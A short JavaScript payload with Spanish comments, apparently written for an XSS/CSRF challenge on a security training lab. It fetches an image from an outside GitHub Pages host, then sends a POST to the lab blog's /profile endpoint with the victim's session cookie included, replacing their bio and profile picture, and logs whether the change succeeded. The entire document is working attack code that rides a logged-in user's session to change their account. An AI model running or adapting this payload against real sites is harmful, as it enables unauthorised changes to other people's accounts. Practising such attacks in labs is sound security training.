const imageUrl = 'https://guidobitti.github.io/xss-lab/60972824b15cf0fd.jpg';

fetch(imageUrl)
  .then(res => res.blob())
  .then(blob => {
    const file = new File([blob], 'profile_pic.jpg', { type: blob.type });

    const formData = new FormData();
    formData.append('bio', 'Esta es mi nueva bio desde JS');
    formData.append('profile_pic', file);

    return fetch('https://chl-03d590ca-f868-4b6b-a054-087fd4a6165b-blog-hacklab.softwareseguro.com.ar/profile', {
      method: 'POST',
      body: formData,
      credentials: 'include' // envía la cookie de sesión
    });
  })
  .then(res => res.text())
  .then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const alert = doc.querySelector('.alert-success');
    if (alert) {
      console.log(alert.textContent); // Perfil actualizado correctamente!
    } else {
      console.log('No se actualizó, revisa sesión o archivo');
    }
  })
  .catch(err => console.error('Error:', err));

